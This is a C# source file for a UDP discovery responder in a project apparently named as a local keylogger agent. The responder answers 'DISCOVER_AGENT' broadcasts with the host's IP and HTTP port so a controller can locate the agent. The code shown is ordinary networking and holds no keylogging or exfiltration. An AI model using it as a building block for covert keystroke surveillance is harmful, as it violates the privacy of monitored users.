using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace Local_Keylogger_Agent
{
    internal class DiscoveryResponder
    {
        private const int DiscoveryPort = 5001; // Port for discovery responder
        private UdpClient udpClient;
        public void StartDiscoveryResponder()
        {
            udpClient = new UdpClient(DiscoveryPort) { EnableBroadcast = true };
            Task.Run(async () =>
            {
                try
                {
                    while (true)
                    {
                        var result = await udpClient.ReceiveAsync();
                        string message = Encoding.UTF8.GetString(result.Buffer);
                        if (message == "DISCOVER_AGENT")
                        {
                            string localIp = GetLocalIPv4Address();
                            if(result.RemoteEndPoint.Address.ToString() == localIp)
                            {
                                continue;
                            }

                            byte[] responseBytes = Encoding.UTF8.GetBytes($"AGENT_RESPONSE: {localIp} : Port {HTTPServer.HTTPort}");
                            await udpClient.SendAsync(responseBytes, responseBytes.Length, result.RemoteEndPoint);
                        }
                    }
                }
                finally
                {
                    udpClient?.Close();
                }
            });
        }



        private string GetLocalIPv4Address()
        {
            var preferredTypes = new[]
            {
                NetworkInterfaceType.Ethernet,
                NetworkInterfaceType.Wireless80211,
            };

            foreach (var networkInterface in NetworkInterface.GetAllNetworkInterfaces())
            {
                if(!preferredTypes.Contains(networkInterface.NetworkInterfaceType))
                {
                    continue;
                }

                if (networkInterface.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (var ipAddress in networkInterface.GetIPProperties().UnicastAddresses)
                    {
                        if (ipAddress.Address.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ipAddress.Address))
                        {
                            return ipAddress.Address.ToString();
                        }
                    }
                }
            }

            return "127.0.0.1";
        }
    }
}
